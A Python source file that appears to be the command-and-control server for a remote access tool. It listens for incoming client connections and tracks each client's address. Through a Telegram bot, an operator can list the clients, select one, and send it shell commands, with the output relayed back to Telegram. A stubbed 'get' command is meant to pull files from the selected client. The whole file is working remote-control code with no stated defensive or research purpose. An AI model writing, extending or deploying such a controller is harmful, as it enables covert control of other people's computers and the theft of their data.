# repl.it is awesome
import socket
import threading
import teleApi as tg
import os
import re
import getFile
import time
# ggjjj
# space for alafl clients and their corrosponding addrs
all_clients=[]
all_addr = []

# server info
host = "localhost"
port = 24980

headerLength = 100

#create socket
serv = socket.socket()
serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


# bind the socket
def bind_sock():
    serv.bind((host, port))
    serv.listen()


# constantly look for new connection with the help thearding
def accept_conn():
    while 1:
        client, addr = serv.accept()
        all_clients.append(client)
        all_addr.append(addr)


# recive msg for variable length
def recv(client):
    msg = client.recv(headerLength).decode()
    n = int(msg)
    msg = client.recv(n).decode()
    return msg

# send message with header (size of msg)
def send(client, msg):
    msg = f'{len(msg):<{headerLength}}{msg}'
    client.send(msg.encode())

# main menu
def options():
    while 1:
        # os.system('clear')
        id, cmd = tg.trecv()
        if (cmd == 'list'):
            tg.tsend(id, "please wait...")
            show_list(id)
        elif 'select ' in cmd:
            clientNo = int(cmd[7:]) - 1
            connectTo(id, all_clients[clientNo])
        else:
            tg.tsend(id, 'Type list to see all clients')


# show list of active clients and modify list if not active
def show_list(id):
    cli = "~~~~~~~ clients ~~~~~~~\n"
    for i, con in enumerate(all_clients):
        try:
            # con.send('ehlo'.encode())
            send(con, 'hello')
            name = recv(con)
            cli += f"{i+1} - {name}_{all_addr[i][1]}\n"
            # print(cli)
        except:
            # think more ---
            del all_clients[i]
            del all_addr[i]
    tg.tsend(id, cli)


# work with connected client
def connectTo(id, client):
    tg.tsend(id, 'The client is selected')
    while 1:
        tg.tsend(id, 'Enter the command you want to execute')
        id, cmd = tg.trecv()
        send(client, cmd)

        if cmd == 'exit':
            break
        elif 'get ' in cmd and len(cmd) > 4:
            # getFile.main(client, id, cmd[4:])
            continue
        tg.tsend(id, recv(client))
    tg.tsend(id, 'Type "list" to see all clients')


# starting of execution
def main():
    bind_sock()

    conn = threading.Thread(target=accept_conn)
    conn.start()

    # to remove previous msgs in begining
    clearTelegramBuffer = threading.Thread(target=tg.tfreshStart)
    clearTelegramBuffer.start()
    clearTelegramBuffer.join()

    options()


# if this is the file to exec
if __name__ == "__main__":
    main()
    print("end")